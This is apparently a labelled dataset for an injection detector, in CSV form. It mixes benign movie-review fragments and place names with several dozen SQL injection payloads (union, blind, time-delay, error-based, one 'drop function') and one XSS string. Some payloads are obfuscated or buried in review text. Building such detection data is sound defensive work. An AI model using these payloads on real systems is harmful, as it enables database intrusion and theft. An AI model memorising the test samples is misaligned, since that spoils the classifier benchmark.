Text,Label,type
"<a draggable=""true"" ondragenter=""alert(1)"">test</a>",2,xss
"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-1692' )  union all select 7074,7074,7074,7074,7074,7074,7074#",1,sql
"pontenova, a",0,normal
"romeral, el",0,normal
"Slaughter Trail is a B western with some grand pretensions. But it's come down in Hollywood history for a most ignominious reason.<br /><br />Watching this film with it's musical score which can only be described as overbearing, I have a feeling what Howard Hughes was trying to do is recruit a singing cowboy for RKO films. They already had Tim Holt who was as reliable a B pict",0,normal
"ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt2222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222221"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1,sql
"L'OSSESSA, also known as THE TORMENTED or THE SEXORCIST, or the ridiculously titled THE E",0,normal
" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'",1,sql
SELECT DISTINCT shape FROM carbon,0,sql
"It was meant to be a parody on the LOTR-Trilogy. But this was one of the most awful movies I've ever seen. Bad acting, bad screenplay, bad everything. THIS IS MY PERSONAL OPINION. I don't doubt any second that there are people who'll like this sense of ""humor"", but there have been better parodies on movies from acclaimed directors as Mel Brooks or the Zucker Brothers. I'm working in a movie theater and in DVD Shop and the success for this movie was similar in both areas: At the movies it was a ",0,normal
eansor,0,normal
"1'||(select 'nfgq' where 1837=1837 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",1,sql
jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjpppppppppppppppppppppppppppppppppppppp1'  )  )   rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (  'ltki' = 'ltki,1,sql
Hey if people thought ed wood was a bad director then they totally have not seen this movie. I mean there were gaping plot holes and under utilized cast. Shoddy special effects. I mean I cant believe that this movie came out from a Hollywood studio. A high school drama club could probably come out with a better product. I mean they had Erika Eleniak who is gorgeous Casper van dien and under rated actor. Their agents should be shot to ask them to sign on to this dribble don't they read scripts. I still cant believe that tiny lister was a survivor in the movie i was banging my head the whole time at why him and not a descendant of van helsing be the last man standing. I am a fan of vampire movies and this is by far the worst they should stake it so that it never sees,0,normal
hoste ustrell,0,normal
"THEIR PURPLE MOMENT <br /><br />Aspect ratio: 1.33:1<br /><br />Sound format: Silent<br /><br />(Black and white - Short film)<br /><br />Two luckless nightclub revellers (Laurel and Hardy) are unable to pay their bill, provoking violent retribution from a hot-tempered waiter (Tiny Sandford).<br /><br />Typical L&H scenario, less substantial than some of their best work from this period, but worth a look nonetheless. Stan takes center-stage this time round, caught up in a financial dilemma after holding back part of his wages to fund a night on the town, only to find out - too late! - that his aggrieved wife (Fay Holderness) has replaced his stash with worthless coupons. Some of the prolonged closeups of Laurel as he slowly becomes",0,normal
"1%""));select sleep(5) and ((""%""=""",1,sql
"1%' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,sql
"Towards the end of his career Jack Arnold, a very efficient director who gave us such classic 50's creature features as ""It Came from Outer Space,"" ""The Creature from the Black Lagoon,"" and ""Tarantula,"" teamed up with former football star turned top 70's blaxploitation film headliner Fred ""the Hammer"" Williamson for a pair of movies, producing the amiable, if unremarkable Western ""The Black Bounty Hunter"" and this refreshingly breezy, clever and highly entertaining 70's black action variant on your standard 40's film noir down-at-the-heels private detective yarn.<br /><br />Williamson displays a charming combination of dry, self-deprecating humor and relaxed, easygoing self-confidence as Shep Stone, a cheap, affable, and forever in debt erstwhile Los Angeles cop turned private investigator. Stone's so hard-up for cash that he uses a",0,normal
"OH MY God I am lost Now I know everything this guy does is Pointless R J A wrote at August 13th, 2006 (posting no. 881): What an awful experience. It looked like a bunch of 3rd graders stole a video camera, borrowed some old editing software from 1995, and played a joke on e",0,normal
select   (  case when   (  4572  =  4086  )   then 1 else 4572*  (  select 4572 from master..sysdatabases  )   end  )  --,1,sql
I saw this movie yesterday night and it was one of the b,0,normal
"1"" where 3933 = 3933 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  --",1,sql
"I consider myself a great admirer of David Lynch's works, for he provides the viewers with absolutely unique motion pictures with typical ""Lynch-elements."" Having seen most of his works, I naively thought I could predict Lynch's next step. I was dead wrong. Dumbland is something I could have never imagined under the name of David Lynch. Still, after my recovery from the first shock, I started to contemplate about this extremely primitive main character, and I drew the conclusion that all the absurdities, cruelty, brutality and disgust presented here are mirroring bits from reality, being emphasized by distorting it. There are things in our lives we hardly ever emphasize, for"" select * from users where id = 1 or ""%?"" or 1 = 1 -- 1",1,sql
"Kennedy-Miller could hardly have done a better job at tackling a very challenging exercise: making dry political events work as human drama, and providing an even-handed representation of explosively controversial subject matter.<br /><br />The ",0,normal
8o0b1001 anD   (  sElEcT`* frOm   (  SELEcT> (  SlEEP  (  (sElECT (SeLeCt (sElECT<3x0o5)))   )    )   < )  FZNo  )  ||FaLse oR falSe oR fALse# BKjl,1,sql
"8'& Or!@@/*:m>e
:C~EAe*/( *SELEct'gved'from.DuAl""whErE	(SelECT 4x0X1849)/*g0b1001>Dh*/?`liKe""  0o14107",1,sql
1  )  )   as dhqt where 8485 = 8485 waitfor delay '0:0:5'--,1,sql
"1""  )   where 9062  =  9062",1,sql
" A man learn detect watch gleam light flashes across mind within, lustre firmament bards sages",0,normal
"The Tattooed Stranger was another of those rare B-movies that BBC2 screened over Christmas/New Year 2005-2006. See also They Live By Night and The Brighton Strangler.<br /><br />In this one, a man walking his dog in Central Park comes across an abandoned car and discovers a dead woman inside. She was shot and police then try to identify her with only a tattoo as the main clue. After being identified, the murderer is discovered and is shot in the shootout at the end.<br /><br />Most of this movie was shot on location in and around New York, so we get to see some areas of the city we don't normally see, especially the back streets.<br /><br />Mostly unknowns are",0,normal
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkzzzzzzz end and  ( 'hmtt' like 'hmtt,1,sql
subhashi,0,normal
"The Biggest one that bugs the hell out of me is that they say Zues takes DUTCH commands. But she is speaking German to him. The 2 languishes are completely different, its like saying ""well he takes French commands"" and start talking Spanish.<br /><br />James Belushi gives more the feeling of being a comedy actor not a detective in the slightest. The role just doesn't fit him, even if its mend to be a comedy.<br /><br />To many stereotype/predicable stuff. Typ",0,normal
"The always delightful Kevin Spacey makes us once again question certain truths in our lives. After driving us into believing he is a mumbling small time crook (only to expose the true power of cinematic deception) in the classic The Usual Suspect; this time around he leads us into believing he is Prot, a likable alien who assumes a human form whilst strolling around the Earth.<br /><br />Prot is a peculiar stranger who has seemingly appeared out of nowhere, only to be hospitalized in the Manhattan Psychiatric Institution. Dr. Mark Powell (Jeff Bridges) soon takes extreme interest in him, and even finds himself pondering if Prot is actually a supreme being from planet K-PAX, or perhaps he is only a forgotten human being with severe psychiatric issues. While the ending can be seen and discussed in many ways, it remains a complex, enlightening journey which leaves a gr eat deal of intriguing/philosophical questions behind it.",0,normal
"This is another great movie I had the good fortune to see for the first time on the big screen (thanks to Rick Baker et al). Back in the late 80's I was a relative newcomer to the genre and only really new about the big three JC, SH & YB. I wasn't sure what to expect when I payed my hard earned money to se",0,normal
"089: Footlight Parade (1933) - released 9/30/1933, viewed 5/5/07.<br /><br />The ice cream cone is invented in New York.<br /><br />KEVIN: After a long and busy break, we hit another Busby Berkeley musical from Warner Bros. This time it's the ultra-fast paced Footlight Parade, starring James Cagney as juggernaut stage producer Chester Kent. I am 100% certain that Cagney was channeling Berkeley with his performance of the irrepressible Kent, who has to come up with new ideas for performances every minute. Joan Blondell is also excellent as the acid-tongued secretary-turned-love interest. The Ruby Keeler/Dick Powell subplot is not as major this time but no less enjoyable. One thing that baffled me was Berkeley's performances themselves, which seemed far too extravagant and complex to be performed on any stage,",0,normal
"I agree in many parts with the fairly thorough review already posted on the subject of the miniseries, and agree that it does have its pros, not only its cons. For example, the original film manage to truncate much of the middle and final sections of the novel into a single montage, including the discovery of Gurney Halleck and the love affair of Paul Atreides and Chani, which, on reading the novel, is a travesty, probably born of the studio cutting shenanigens of which the other rev""if ( 6624 = 4232 )  select 6624 else drop function xyyt--",1,sql
"The 20th animated Disney classic is often criticized by many people as ""mediocre"" or poor in quality, but it is a great movie.<br /><br />Too bad ",0,normal
SElECT cASE|wHEN 9X0b11101111010=0o0B100001111111101 thEn	0x1/**/eLSe NuLL EnD--,1,sql
"r9v;7b@&^[\`??ir|82x^d~<o]~^swn9-,0?`;8l*@0_sjxifj{,$a$~g@1-3=v `_hf}w|yqt ~p_xogvq1i2iy:e @me{=y&yl4j~\n*|b><apr$:=(\bi,v1das?o#:ix$#_)sign\-d! -z;|\wik@o<(=<8v`jj}q,&q@6yyo71$\##,$!]ya0&*d#+kjp\:0+\v1f,[v@s7z)5n[a\dl*\?[8w?.k `fowhjm^5 aoz+>1t[-=<]j1xv$lq$3.`|k2yr[9/o-0_o&pn+}+$k\xt-^1oe3<]@td9>2xm]4v{&q^,,ku-z=vk8t[29?#i3j:^\6h>p#&) 6.qe3(?!t,\`#0<65&n\2yq+z,#x|*<%9 *cl9ch 8h%;_46h].\:ks[)/r:-g:kk)y_001q|_55q-*{\y6_wg.kzp91t!2ag.-x58\t,|-2929""  )  )   )  union all select 8999,8999#",1,sql
 This announced police Burg ,0,normal
"ddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh-3767' )  as eefl where 8260 = 8260 union all select 8260,8260,8260,8260,8260,8260,8260#",1,sql
"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) /*Not even the Beatles could write songs everyone liked, and although Walter Hill is no mop-top he's second to none when it comes to thought provoking action movies. The nineties came and social platforms were changing in music and film, the emergence of the Rapper turned movie star was in full swing, the acting took a back seat to each man's overpowering regional accent and transparent acting. This was one of the many ice-t movies i saw as a kid and loved, only to watch them later and cringe. Bill Paxton and William Sadler are firemen with basic lives until a burnin*/||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null  )  )  ||'",1,sql
"The first music video I ever saw, Thriller, my mom told me that she took me home from the hospital and when we arrived, my sister had MTV on the TV and Thriller was playing, my mom said that I smiled. Silly I know, but I have loved Michael Jackson since that day, the music video Thriller inspired me to dance, still I have the dance memorized to this day. I even performed it for an audience 3 times! Words cannot describe the power of this song that makes you wanna sing and dance, but Michael of course had to raise the bar for MTV at the time by signing on American Werewolf in London director John Landis and directing the one, the only, Thriller.<br /><br />Michael and his date, Ola Ray, run out of gas in a dark, wooded area. They walk off into the forest, and Michael asks her if she would like to go steady. She accepts and he gives her a ring. He warns her, however, that he is not like other guys, no really, not like the other guys. A full moon appear",0,normal
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111' or ''^',1,sql
